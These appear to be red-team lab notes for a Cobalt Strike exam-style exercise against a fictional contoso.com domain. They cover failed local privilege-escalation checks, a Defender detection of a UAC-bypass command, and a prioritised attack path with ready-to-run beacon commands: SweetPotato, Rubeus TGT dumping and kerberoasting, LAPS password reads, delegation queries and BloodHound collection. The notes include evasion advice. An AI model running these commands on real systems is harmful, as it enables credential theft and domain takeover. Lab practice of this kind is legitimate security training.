# Local Privilege Escalation — LON-WKSTN-1 (AppLocker Lab)

## Context

- **Host:** LON-WKSTN-1 (10.10.121.108)
- **User:** `CONTOSO\pchilds` — medium integrity, **NOT admin** (UAC blocking elevation)
- **Group membership:** pchilds is a member of **SID `-1106` (Workstation Admins)** which has `AdminTo` on LON-WKSTN-1 via GPO Restricted Groups — group membership is present but UAC blocks the current medium-IL beacon from using it directly.

---

## PowerUp Enumeration Results (2026-04-26)

| Check | Result |
|-------|--------|
| `Get-ModifiableServiceFile` | FALSE POSITIVE — `ModifiableFile: C:\` is Windows default `AppendData/AddSubdirectory` on root, NOT the actual service binary. Services: `ClickToRunSvc`, `edgeupdate`, `edgeupdatem`. All `CanRestart: False`. |
| `Get-ModifiableService` | Empty — no service ACL misconfig |
| `Get-UnquotedService` | Empty |
| `Get-RegistryAlwaysInstallElevated` | False |
| `Get-ModifiableRegistryAutoRun` | Empty |
| Scheduled task writable paths | No hits |
| Service registry keys | Only `ReadKey` for `BUILTIN\Users` / `Authenticated Users` — no `FullControl` |

**Conclusion:** No clean service-based privesc path found. All PowerUp `ModifiableFile: C:\` results are false positives.

---

## Privileges on Current Token

```
SeShutdownPrivilege           Disabled
SeChangeNotifyPrivilege       Enabled
SeUndockPrivilege             Disabled
SeIncreaseWorkingSetPrivilege Disabled
SeTimeZonePrivilege           Disabled
```

No `SeImpersonatePrivilege` — `getsystem` named pipe technique will NOT work from this token.

---

## ⚠️ DEFENDER OBSERVATION — 2026-04-26

**Technique:** `elevate uac-token-duplication smb`
**Result:** DETECTED — beacon stopped checking in immediately after execution
**OPSEC Risk:** 🔴UNSAFE — `elevate` built-ins are convenience wrappers, NOT exam-grade stealth
**Why caught:** Token duplication from high-IL process + new elevated process spawn + beacon DLL load = well-signatured chain. Generates Event 4688 (elevated process creation), Event 4648 (token use). All Defender versions flag this pattern.
**Exam lesson:** NEVER use `elevate` on exam day. The entire `elevate` command family is 🔴UNSAFE against active Defender + SIEM.
**Workaround:** See exam-safe alternatives below

---

## SYSTEM Path — Alternatives to `uac-token-duplication`

Since pchilds is in Workstation Admins (local admin via GPO), UAC bypass is needed to get a high-IL beacon. `uac-token-duplication` is caught. Try these in order:

```cs
// 1. elevate svc-exe — spawns a SYSTEM service beacon (OPSEC-🟠CAUTION — writes to disk)
//    Requires local admin token — may still fail at medium IL
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> elevate svc-exe smb

// 2. steal_token from a SYSTEM process if any become visible
//    Only works if a SYSTEM process appears in process_browser
beacon> steal_token <SYSTEM-pid>
beacon> getsystem

// 3. PrintSpoofer / EfsPotato BOF — if SeImpersonatePrivilege ever becomes available
//    (after landing SYSTEM via another path or after a service impersonation chain)
beacon> execute-assembly C:\Tools\SweetPotato\SweetPotato.exe -e EfsRpc -p beacon.exe
```

> **Note:** `uac-token-duplication` is signatured in this lab environment. Do NOT retry it.

---

## DC Attack Path (Skip Workstation Privesc — Go Directly)

pchilds can attack the domain from a medium-IL beacon. Do not block progress on SYSTEM.

### Step 1 — Inject TGT for ldapsearch

```cs
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<LUID> /nowrap
// Save kirbi, then:
beacon> kerberos_ticket_use C:\Users\pchilds\AppData\Local\Temp\pchilds.kirbi
```

### Step 2 — BOFHound Domain Sweep (`OPSEC-🟢SAFE`)

```cs
beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```

### Step 3 — Quick Privesc Path Queries

```cs
// Kerberoast — oracle_svc and mssql_svc confirmed in domain
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:oracle_svc /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

// LAPS — read = instant local admin creds on that host
beacon> ldapsearch (ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd

// Unconstrained delegation — highest value (TGT capture → DCSync)
beacon> ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl

// Constrained delegation — protocol transition to DC service
beacon> ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo
```

### Step 4 — BloodHound

```bash
# Ubuntu WSL on Attacker Desktop
cd /mnt/c/Users/Attacker/Desktop
scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
bofhound -i logs
```

Load JSON into BloodHound → Explore → Cypher: `MATCH (n:GPO) return n` → find Workstation Admins GPO attack paths.

---

## Domain Info Collected

| Field | Value |
|-------|-------|
| Domain | contoso.com |
| DC | lon-dc-1.contoso.com (10.10.120.1) |
| Domain Admins | dyork (SID -1109), Administrator (SID -500) |
| Service accounts | oracle_svc, mssql_svc (Kerberoastable) |
| pchilds groups | Domain Users, BUILTIN\Users, Workstation Admins (SID -1106) |

---

## Priority Order

1. Re-establish beacon (AppDomainManager or Scripted Web Delivery from C:\Payloads)
2. Kerberoast `oracle_svc` / `mssql_svc` — crack offline
3. Check LAPS — may give free local admin on another host
4. Run BOFHound ldapsearch sweep
5. Check delegation misconfigs
6. Revisit SYSTEM on LON-WKSTN-1 only if needed for a specific path
